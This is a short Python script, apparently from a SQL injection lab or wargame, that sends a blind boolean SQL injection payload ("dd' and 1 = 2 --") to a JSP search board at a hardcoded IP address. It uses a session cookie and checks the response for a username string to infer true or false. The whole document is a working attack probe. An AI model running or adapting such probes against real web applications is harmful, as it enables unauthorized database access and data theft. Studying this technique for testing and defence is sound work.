import requests

url = "http://3.36.127.85:8000/SQL3/board.jsp"
cookie = {'JSESSIONID': '5DB16415D7EB29B84BD75497CB9A9473'} # 쿠키 값 넣기

param = {"search": "dd' and 1 = 2 --"}
req = requests.get(url, params = param, cookies = cookie)

if "mas9623" in req.text:
    print(param['search'], "True")
else:
    print(param['search'], "False")